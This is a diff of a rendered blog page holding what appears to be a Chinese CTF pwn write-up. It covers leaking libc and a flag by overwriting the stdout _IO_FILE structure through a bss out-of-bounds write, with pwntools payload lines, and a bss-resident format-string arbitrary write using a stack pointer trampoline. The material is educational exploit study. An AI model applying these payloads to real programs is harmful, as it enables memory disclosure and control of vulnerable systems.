@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/about/">
               
-              分类
+              关于
               
               
             </a>
@@ -241,9 +241,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">456</span> In Total
+              Words <span class="post-count">457</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,79 +420,79 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="IO-2-1-stdin-与-bss-format"><a href="#IO-2-1-stdin-与-bss-format" class="headerlink" title="IO_2_1_stdin 与 bss_format"></a><em>IO_2_1_stdin</em> 与 bss_format</h1><h2 id="IO-2-1-stdin"><a href="#IO-2-1-stdin" class="headerlink" title="IO_2_1_stdin"></a>IO_2_1_stdin</h2><h3 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h3><p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104230478.png" alt></p>
+        <h1 id="io_2_1_stdin-与-bss_format"><em>IO_2_1_stdin</em> 与
+bss_format</h1>
+<h2 id="io_2_1_stdin">IO_2_1_stdin</h2>
+<h3 id="附件">附件：</h3>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104230478.png"></p>
 <p><code>bss</code>数组越界</p>
-<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104328361.png" alt></p>
-<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104507982.png" alt></p>
-<p><code>flag</code>在内存里，<code>puts</code> +  <code>0x16D2E0</code>的地方（这里<code>F5</code>之后 + 的不对，不知为何）</p>
-<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104551388.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104328361.png"></p>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104507982.png"></p>
+<p><code>flag</code>在内存里，<code>puts</code> +
+<code>0x16D2E0</code>的地方（这里<code>F5</code>之后 +
+的不对，不知为何）</p>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828104551388.png"></p>
 <p>防护全开</p>
 <p>总结一下，给了个<code>bss</code>的任意指针写！考虑打<code>stdout</code>泄露地址</p>
 <p>这里第一次接触<code>_IO_FILE</code>结构，久仰大名了属于是</p>
-<pre><code class="lang-c">pwndbg&gt; ptype stdout
-type = struct _IO_FILE &#123;
-    int _flags;
-    char *_IO_read_ptr;
-    char *_IO_read_end;
-    char *_IO_read_base;
-    char *_IO_write_base;  //  泄露开始地址
-    char *_IO_write_ptr;   //  泄露结束地址
-    char *_IO_write_end;
-    char *_IO_buf_base;
-    char *_IO_buf_end;
-    char *_IO_save_base;
-    char *_IO_backup_base;
-    char *_IO_save_end;
-    struct _IO_marker *_markers;
-    struct _IO_FILE *_chain;
-    int _fileno;
-    int _flags2;
-    __off_t _old_offset;
-    unsigned short _cur_column;
-    signed char _vtable_offset;
-    char _shortbuf[1];
-    _IO_lock_t *_lock;
-    __off64_t _offset;
-    struct _IO_codecvt *_codecvt;
-    struct _IO_wide_data *_wide_data;
-    struct _IO_FILE *_freeres_list;
-    void *_freeres_buf;
-    size_t __pad5;
-    int _mode;
-    char _unused2[20];
-&#125; *
-</code></pre>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113845320">https://blog.csdn.net/qq_41202237/article/details/113845320</a></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> ptype stdout</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>type <span class="op">=</span> <span class="kw">struct</span> _IO_FILE <span class="op">&#123;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> _flags<span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_read_ptr<span class="op">;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_read_end<span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_read_base<span class="op">;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_write_base<span class="op">;</span>  <span class="co">//  泄露开始地址</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_write_ptr<span class="op">;</span>   <span class="co">//  泄露结束地址</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_write_end<span class="op">;</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_buf_base<span class="op">;</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_buf_end<span class="op">;</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_save_base<span class="op">;</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_backup_base<span class="op">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_save_end<span class="op">;</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> _IO_marker <span class="op">*</span>_markers<span class="op">;</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> _IO_FILE <span class="op">*</span>_chain<span class="op">;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> _fileno<span class="op">;</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> _flags2<span class="op">;</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>    __off_t _old_offset<span class="op">;</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">short</span> _cur_column<span class="op">;</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>    <span class="dt">signed</span> <span class="dt">char</span> _vtable_offset<span class="op">;</span></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> _shortbuf<span class="op">[</span><span class="dv">1</span><span class="op">];</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>    _IO_lock_t <span class="op">*</span>_lock<span class="op">;</span></span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>    __off64_t _offset<span class="op">;</span></span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> _IO_codecvt <span class="op">*</span>_codecvt<span class="op">;</span></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> _IO_wide_data <span class="op">*</span>_wide_data<span class="op">;</span></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> _IO_FILE <span class="op">*</span>_freeres_list<span class="op">;</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>    <span class="dt">void</span> <span class="op">*</span>_freeres_buf<span class="op">;</span></span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>    <span class="dt">size_t</span> __pad5<span class="op">;</span></span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> _mode<span class="op">;</span></span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> _unused2<span class="op">[</span><span class="dv">20</span><span class="op">];</span></span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span> <span class="op">*</span></span></code></pre></div>
+<p>https://blog.csdn.net/qq_41202237/article/details/113845320</p>
 <p>贴一下好好说话系列，讲的也很清楚。</p>
 <p>首先<code>_flag</code>的设定需要满足</p>
-<pre><code class="lang-python">_flags = 0xFBAD1800
-</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>_flags <span class="op">=</span> <span class="bn">0xFBAD1800</span></span></code></pre></div>
 <p>因为为了泄露出我们需要的地址，需要一些标志位满足判断</p>
 <p>再设置下面的成员为<code>0</code></p>
-<pre><code class="lang-c">    char *_IO_read_ptr;
-    char *_IO_read_end;
-    char *_IO_read_base;
-</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_read_ptr<span class="op">;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_read_end<span class="op">;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_read_base<span class="op">;</span></span></code></pre></div>
 <p>最好再来修改</p>
-<pre><code class="lang-c">    char *_IO_write_base;  //  泄露开始地址
-    char *_IO_write_ptr;   //  泄露结束地址
-</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_write_base<span class="op">;</span>  <span class="co">//  泄露开始地址</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>_IO_write_ptr<span class="op">;</span>   <span class="co">//  泄露结束地址</span></span></code></pre></div>
 <p>综上<code>payload</code>为</p>
-<pre><code class="lang-python">b&#39;feedback.\n&#39;,p64(0xfbad1800)+p64(0x0)*3+b&#39;\x00&#39;
-</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="st">b&#39;feedback.</span><span class="ch">\n</span><span class="st">&#39;</span>,p64(<span class="bn">0xfbad1800</span>)<span class="op">+</span>p64(<span class="bn">0x0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span></span></code></pre></div>
 <p>泄露<code>_IO_2_1_stdin_</code>，<code>\x00</code>的设置刚好讲<code>_IO_write_base</code>低位置<code>0</code>，刚好可以泄露出<code>_IO_2_1_stdin_</code>的地址</p>
-<pre><code class="lang-python">_IO_2_1_stdin_addr = u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
-</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>_IO_2_1_stdin_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;</span><span class="ch">\x7f</span><span class="st">&#39;</span>)[<span class="op">-</span><span class="dv">6</span>:].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span></code></pre></div>
 <p>遇到<code>puts</code>或者 <code>printf</code>输出函数，便会泄露</p>
 <p>最后泄露<code>flag</code>即可</p>
-<pre><code class="lang-python">payload = p64(0xfbad1800)+p64(0x0)*3 + p64(flag_addr) + p64(flag_addr + flag_size)
-</code></pre>
-<h2 id="bss-format"><a href="#bss-format" class="headerlink" title="bss_format"></a>bss_format</h2><p>格式化字符串，但是存储在<code>bss</code>上。不能用传统的传地址在栈上完成任意写。</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> p64(<span class="bn">0xfbad1800</span>)<span class="op">+</span>p64(<span class="bn">0x0</span>)<span class="op">*</span><span class="dv">3</span> <span class="op">+</span> p64(flag_addr) <span class="op">+</span> p64(flag_addr <span class="op">+</span> flag_size)</span></code></pre></div>
+<h2 id="bss_format">bss_format</h2>
+<p>格式化字符串，但是存储在<code>bss</code>上。不能用传统的传地址在栈上完成任意写。</p>
 <p>栈的结构如下</p>
-<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828110434394.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828110434394.png"></p>
 <p>此时可以找如<code>ebp</code>那种指向栈内的指针，先用格式化字符对那个地址任意写，写入我们想修改的地址，再找偏移，对<code>ebp</code>写入的地址再写入，这样便可达成任意写。栈上跳板。</p>
-<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828110811636.png" alt></p>
-<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828110737039.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828110811636.png"></p>
+<p><img src="/cn/Sagiring_markdown/IO_2_1_stdin%20%E4%B8%8E%20bss_format/image-20230828110737039.png"></p>
 
 
         <hr>
@@ -642,7 +642,8 @@ type = struct _IO_FILE &#123;
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#IO-2-1-stdin-%E4%B8%8E-bss-format"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">IO_2_1_stdin 与 bss_format</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#IO-2-1-stdin"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">IO_2_1_stdin</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%99%84%E4%BB%B6%EF%BC%9A"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">附件：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#bss-format"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">bss_format</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#io_2_1_stdin-%E4%B8%8E-bss_format"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">IO_2_1_stdin 与
+bss_format</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#io_2_1_stdin"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">IO_2_1_stdin</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">附件：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#bss_format"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">bss_format</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -1166,6 +1167,21 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
-	</body>
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
 </html>
 
